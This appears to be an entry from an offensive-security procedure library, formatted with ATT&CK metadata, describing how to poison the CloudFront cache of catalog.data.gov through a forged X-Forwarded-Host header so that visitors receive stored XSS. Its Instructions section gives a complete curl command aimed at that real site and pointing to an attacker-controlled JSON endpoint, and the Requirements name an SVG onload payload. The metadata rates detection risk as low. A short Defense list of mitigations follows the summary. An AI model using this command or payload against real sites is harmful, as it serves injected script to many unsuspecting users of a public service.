---
id: proc-poison-cloudfront-xforwarded
tags:
  - web-cache-poisoning
  - cloudfront
  - x-forwarded-host
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-poison-cloudfront-cache]]'
verified: false
platforms:
  - Web
  - AWS
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-13T23:06:26.614Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Poison-CloudFront-Cache-with-Malicious-X-Forwarded-Host

## Summary

This procedure poisons the AWS CloudFront cache by sending a crafted HTTP request with a malicious X-Forwarded-Host header, causing the server to generate a response with tainted 'data-site-root' and 'data-locale-root' attributes that lead to subsequent DOM-based XSS.

## Description

The server on catalog.data.gov trusts the X-Forwarded-Host header without validation, using it to set attributes in the HTML <body> tag. By setting this header to an attacker-controlled domain (e.g., portswigger-labs.net/catalog.data.gov_json_xss/json.php?), the response is cached in CloudFront. When victims visit the poisoned URL, client-side JavaScript fetches JSON from the attacker's endpoint and injects it unescaped into the DOM, enabling stored XSS. This affects endpoints like /dataset/consumer-complaint-database and allows defacement or arbitrary JS execution across users.

## Requirements

1. Access to a domain hosting malicious JSON (e.g., a PHP endpoint returning XSS payload like <svg onload=alert(document.domain)>)
2. Network access to send requests to catalog.data.gov over HTTPS
3. curl or similar HTTP client installed

## Defense

Defensive measures and detection strategies:

- Validate and sanitize X-Forwarded-* headers on the server, ignoring untrusted proxies
- Implement cache key normalization in CloudFront to exclude sensitive headers like X-Forwarded-Host
- Use Content Security Policy (CSP) to restrict script sources and inline executions
- Monitor for anomalous cache hits and unusual header values in logs

## Objectives

1. Poison the CloudFront cache to serve tainted responses to multiple users
2. Set up the environment for DOM-based XSS injection
3. Enable widespread impact without direct repeated attacks

## Instructions

### Step 1: Craft and Send Poisoning Request

**Context**: Prepare a GET request mimicking a legitimate browser but with the malicious X-Forwarded-Host to influence the response attributes.

**Command** ([[commands/curl-poison-cloudfront-cache]]):
```bash
curl -i -s -k -X 'GET' -H 'Host: catalog.data.gov' -H 'Accept-Encoding: gzip, deflate' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H 'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H 'Connection: close' 'https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6' > /dev/null
```

> This command sends the request silently, poisoning the cache. Expected: No output, but verify by inspecting a follow-up request's response for the tainted attribute.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-poison-cloudfront-cache]]

## Tools Used

- [[tools/curl]]

## Tags

- web-cache-poisoning
- cloudfront
- x-forwarded-host
